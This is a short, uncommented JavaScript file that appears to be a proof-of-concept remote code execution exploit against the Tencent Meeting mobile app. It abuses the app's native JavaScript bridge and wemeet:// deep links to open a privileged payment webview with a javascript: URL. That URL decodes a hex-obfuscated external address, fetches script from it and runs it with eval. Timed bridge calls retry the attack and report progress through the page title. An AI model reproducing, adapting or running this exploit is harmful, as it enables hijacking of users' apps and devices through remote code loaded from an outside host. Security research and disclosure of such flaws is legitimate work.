(function(){
  document.title='P72JS:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        module:'CommonPlugin',method:'PrintLog',
        param:{log:JSON.stringify(r)},callId:'LOG'
      }));
    }catch(e){}
    document.title='P72CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
      callback:'window.__p',module:mod,method:m,param:p,callId:id
    }));
  }
  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
  var payOff='wemeet://page/pay/main_process_webview?url='+encodeURIComponent(official);
  var payjs="javascript:void(function(){var h='68747470733a2f2f6769747768732e6769746875622e696f2f776d2d706f632d7263652f7037327061792e6a73';var u='';for(var i=0;i<h.length;i+=2)u+=String.fromCharCode(parseInt(h.substr(i,2),16));fetch(u).then(function(r){return r.text()}).then(eval)})()";
  var payJsScheme='wemeet://page/pay/main_process_webview?url='+encodeURIComponent(payjs);
  c('H1','CommonPlugin','GetPerformance',{});
  setTimeout(function(){
    c('N1','CommonPlugin','OpenNewPage',{url:payOff,scheme:payOff});
  }, 2500);
  setTimeout(function(){
    c('N2','CommonPlugin','OpenNewPage',{url:payJsScheme,scheme:payJsScheme,flag:0x24000000});
  }, 7000);
  setTimeout(function(){
    c('N3','CommonPlugin','OpenNewPage',{url:payJsScheme,scheme:payJsScheme,flag:0x20000000,launchMode:'singleTop'});
  }, 10000);
  setTimeout(function(){ document.title='P72-DONE'; }, 14000);
})();
